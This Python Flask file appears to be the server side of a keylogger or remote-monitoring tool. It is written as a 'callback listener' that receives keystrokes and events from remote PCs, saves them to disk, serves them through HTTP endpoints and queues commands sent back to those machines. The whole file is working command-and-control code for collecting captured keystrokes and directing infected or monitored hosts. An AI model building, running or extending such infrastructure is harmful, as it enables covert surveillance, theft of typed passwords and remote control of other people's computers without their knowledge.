"""
Callback Listener - Run this on YOUR machine (the client)
The server will connect to THIS and send data to you!

Usage:
    python callback_listener.py

Your friend sets YOUR IP in his callback_config.json
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
import json
from datetime import datetime
from pathlib import Path
import threading

app = Flask(__name__)
CORS(app)

# Configuration
LISTENER_CONFIG = {
    "port": 8080,
    "callback_key": "change_this_secret_key",  # Must match server's key
    "save_data": True,
    "data_dir": "received_data"
}

# Storage for received data
received_sessions = {}  # pc_id -> session data
commands_to_send = {}   # pc_id -> command queue

# Create data directory
DATA_DIR = Path(LISTENER_CONFIG['data_dir'])
DATA_DIR.mkdir(exist_ok=True)


def check_callback_key():
    """Verify the callback key"""
    key = request.headers.get('X-Callback-Key')
    if key != LISTENER_CONFIG['callback_key']:
        return False
    return True


@app.route('/callback', methods=['POST'])
def handle_callback():
    """Receive data from server"""
    
    # Verify key
    if not check_callback_key():
        return jsonify({"error": "Unauthorized"}), 401
    
    try:
        data = request.json
        if data is None:
            return jsonify({"error": "No data received"}), 400
        pc_id = data.get('pc_id', 'unknown')
        timestamp = data.get('timestamp')
        
        # Store session info
        if pc_id not in received_sessions:
            received_sessions[pc_id] = {
                "pc_name": data.get('pc_name'),
                "first_seen": timestamp,
                "last_seen": timestamp,
                "total_callbacks": 0,
                "events": [],
                "keystrokes": []
            }
            print(f"\n✓ New server connected: {data.get('pc_name')} (ID: {pc_id})")
        
        session = received_sessions[pc_id]
        session['last_seen'] = timestamp
        session['total_callbacks'] += 1
        session['monitoring'] = data.get('monitoring')
        session['event_count'] = data.get('event_count')
        session['keystroke_count'] = data.get('keystroke_count')
        
        # Append new events
        if data.get('events'):
            session['events'].extend(data['events'])
            # Keep only last 1000
            if len(session['events']) > 1000:
                session['events'] = session['events'][-1000:]
        
        # Append new keystrokes
        if data.get('keystrokes'):
            session['keystrokes'].extend(data['keystrokes'])
            # Keep only last 1000
            if len(session['keystrokes']) > 1000:
                session['keystrokes'] = session['keystrokes'][-1000:]
        
        # Save to file if enabled
        if LISTENER_CONFIG['save_data']:
            save_session_data(pc_id, session)
        
        # Print status
        print(f"[{timestamp}] {data.get('pc_name')} - "
              f"Events: {data.get('event_count')}, "
              f"Keystrokes: {data.get('keystroke_count')}, "
              f"Monitoring: {data.get('monitoring')}")
        
        # Check if we have commands to send back
        command = None
        if pc_id in commands_to_send and commands_to_send[pc_id]:
            command = commands_to_send[pc_id].pop(0)
            print(f"  → Sending command: {command}")
        
        return jsonify({
            "status": "received",
            "command": command
        })
        
    except Exception as e:
        print(f"Error handling callback: {e}")
        return jsonify({"error": str(e)}), 500


@app.route('/status', methods=['GET'])
def status():
    """Get status of all connected servers"""
    return jsonify({
        "active_sessions": len(received_sessions),
        "sessions": {
            pc_id: {
                "pc_name": session['pc_name'],
                "last_seen": session['last_seen'],
                "total_callbacks": session['total_callbacks'],
                "monitoring": session.get('monitoring'),
                "event_count": session.get('event_count'),
                "keystroke_count": session.get('keystroke_count')
            }
            for pc_id, session in received_sessions.items()
        }
    })


@app.route('/events/<pc_id>', methods=['GET'])
def get_events(pc_id):
    """Get events from a specific PC"""
    if pc_id not in received_sessions:
        return jsonify({"error": "PC not found"}), 404
    
    limit = int(request.args.get('limit', 100))
    events = received_sessions[pc_id]['events'][-limit:]
    
    return jsonify(events)


@app.route('/keystrokes/<pc_id>', methods=['GET'])
def get_keystrokes(pc_id):
    """Get keystrokes from a specific PC"""
    if pc_id not in received_sessions:
        return jsonify({"error": "PC not found"}), 404
    
    limit = int(request.args.get('limit', 100))
    keystrokes = received_sessions[pc_id]['keystrokes'][-limit:]
    
    return jsonify(keystrokes)


@app.route('/command/<pc_id>', methods=['POST'])
def send_command(pc_id):
    """Queue a command to send to a specific PC"""
    if pc_id not in received_sessions:
        return jsonify({"error": "PC not found"}), 404
    
    command = request.json
    
    if pc_id not in commands_to_send:
        commands_to_send[pc_id] = []
    
    commands_to_send[pc_id].append(command)
    
    return jsonify({"status": "queued", "command": command})


def save_session_data(pc_id, session):
    """Save session data to file"""
    try:
        session_file = DATA_DIR / f"{pc_id}.json"
        with open(session_file, 'w') as f:
            json.dump(session, f, indent=2)
    except Exception as e:
        print(f"Error saving session: {e}")


def print_startup_info():
    """Print startup information"""
    import socket
    
    # Get local IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except:
        local_ip = "Unable to determine"
    
    print("="*70)
    print("CALLBACK LISTENER - Reverse Connection Server")
    print("="*70)
    print(f"\nListening on port: {LISTENER_CONFIG['port']}")
    print(f"Callback key: {LISTENER_CONFIG['callback_key']}")
    print(f"Data directory: {DATA_DIR.absolute()}")
    
    print(f"\n{'-'*70}")
    print("YOUR CONNECTION INFO (Give this to your friend)")
    print(f"{'-'*70}")
    print(f"\nYour Local IP: {local_ip}")
    print(f"Callback URL: http://{local_ip}:{LISTENER_CONFIG['port']}")
    
    print(f"\n{'-'*70}")
    print("FRIEND'S CONFIGURATION")
    print(f"{'-'*70}")
    print("\nTell your friend to create callback_config.json with:")
    print('{')
    print('    "enabled": true,')
    print(f'    "callback_url": "http://{local_ip}:{LISTENER_CONFIG["port"]}",')
    print(f'    "callback_key": "{LISTENER_CONFIG["callback_key"]}",')
    print('    "interval": 10,')
    print('    "retry_interval": 30')
    print('}')
    
    print(f"\n{'-'*70}")
    print("ENDPOINTS")
    print(f"{'-'*70}")
    print(f"\nStatus: http://localhost:{LISTENER_CONFIG['port']}/status")
    print(f"Events: http://localhost:{LISTENER_CONFIG['port']}/events/<pc_id>")
    print(f"Keystrokes: http://localhost:{LISTENER_CONFIG['port']}/keystrokes/<pc_id>")
    print(f"Send Command: POST http://localhost:{LISTENER_CONFIG['port']}/command/<pc_id>")
    
    print("\n" + "="*70)
    print("Waiting for connections...")
    print("="*70 + "\n")


if __name__ == '__main__':
    print_startup_info()
    
    # Start Flask server
    app.run(
        host='0.0.0.0',
        port=LISTENER_CONFIG['port'],
        debug=False,
        threaded=True
    )